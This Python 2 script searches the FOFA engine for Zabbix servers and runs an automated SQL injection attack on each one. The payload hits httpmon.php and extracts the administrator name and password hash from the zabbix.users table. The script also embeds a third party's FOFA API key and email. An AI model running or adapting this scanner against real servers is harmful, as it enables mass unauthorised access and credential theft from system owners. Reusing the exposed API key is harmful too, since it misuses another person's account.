#!/usr/bin/python
#-*- encoding:utf-8 -*-

import urllib2,urllib,cookielib 
import re,sys 
import base64 
import os,json 

def vulwebsearch(keywords): 
    vulhostlist=[] 
    urlenkeywords=urllib2.quote(keywords) 
    searchurl="http://fofa.so/api/result?qbase64="+base64.b64encode(keywords)+"&amp;key=d69f306296e8ca95fded42970400ad23&amp;email=her0m@qq.com"
    req=urllib2.urlopen(searchurl) 
    restring=req.read() 
    restring=json.loads(restring) 
    zabbixsqli(restring['results']) 

def zabbixsqli(vulhostlist): 
    for vulhost in vulhostlist: 
        if not vulhost.startswith('http'): 
            vulhost="http://"+vulhost 
        zabbix_url=vulhost   
        try: 
            payload="""/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28alias,0x7e,passwd,0x7e%29%20as%20char%29,0x7e%29%29%20from%20zabbix.users%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29"""

            content=urllib.urlopen(zabbix_url)   
            if content.getcode()==200: 
                fzadminmd5_url=zabbix_url+payload 
                req=urllib2.urlopen(fzadminmd5_url) 
                html=req.read() 
                adminmd5=re.findall("\~.*\~\~",html) 
                if len(adminmd5)==1: 
                    print zabbix_url,adminmd5 
        except: 
            pass

if __name__=="__main__": 

    if len(sys.argv)!=2: 
        print "Usage:"+"python"+" fofa_zabbix.py "+"keywords"
        print "example:"+"python fofa_zabbix.py title=zabbix"
        sys.exit() 
    else: 
        vulwebsearch(sys.argv[1])